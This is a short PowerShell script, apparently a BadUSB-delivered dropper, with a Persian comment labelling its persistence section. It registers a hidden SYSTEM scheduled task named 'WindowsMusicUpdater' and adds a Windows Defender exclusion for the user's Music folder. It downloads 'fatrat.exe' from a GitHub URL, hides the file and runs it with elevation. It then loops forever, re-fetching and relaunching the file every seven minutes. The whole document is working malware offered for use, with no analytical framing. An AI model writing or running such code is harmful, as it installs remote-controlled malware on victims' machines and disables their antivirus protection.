$path = Join-Path $env:USERPROFILE "Music\fatrat.exe"

if (Test-Path $path) {
    Remove-Item $path -Force
} 

# --- Persistence: اجرای خودکار اسکریپت پس از ری‌استارت ---
$TaskName = "WindowsMusicUpdater"
$ScriptPath = "C:\Windows\System32\script2.ps1"

if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
    $Trigger = New-ScheduledTaskTrigger -AtStartup
    $RepetitionPattern = (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 7)).Repetition
    $Trigger.Repetition = $RepetitionPattern
    $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Description "Windows Music Service" | Out-Null
}

Add-MpPreference -ExclusionPath "$env:USERPROFILE\Music"
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

$url = "https://github.com/armanina444/deadly-spark-attiny85/raw/refs/heads/main/fatrat.exe"
$dest = "$env:USERPROFILE\Music\fatrat.exe"

Invoke-WebRequest -Uri $url -OutFile $dest

Set-ItemProperty -Path $dest -Name Attributes -Value Hidden

Start-Process -FilePath $dest -Verb RunAs   

while ($true) {
    if (-not (Test-Path "$env:USERPROFILE\Music\fatrat.exe")) {
        Invoke-WebRequest -Uri $url -OutFile $dest
        Set-ItemProperty -Path $dest -Name Attributes -Value Hidden
    }
    Start-Process "$env:USERPROFILE\Music\fatrat.exe"
    Start-Sleep -Seconds 420
}
